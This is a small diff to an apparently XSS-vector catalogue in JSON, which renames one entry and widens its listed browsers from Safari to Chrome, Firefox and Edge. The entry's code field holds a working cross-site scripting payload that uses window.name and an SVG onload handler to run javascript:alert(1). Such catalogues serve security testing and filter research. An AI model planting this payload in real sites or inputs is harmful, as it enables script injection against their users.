@@ -182,9 +182,12 @@
         ]
     },
     {
-        "description": "Safari vector using window.name",
+        "description": "Vector using window.name",
         "code": "<script>window.name='javascript:alert(1)';<\/script><svg onload=location=name>",
         "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
             "safari"
         ]
     }
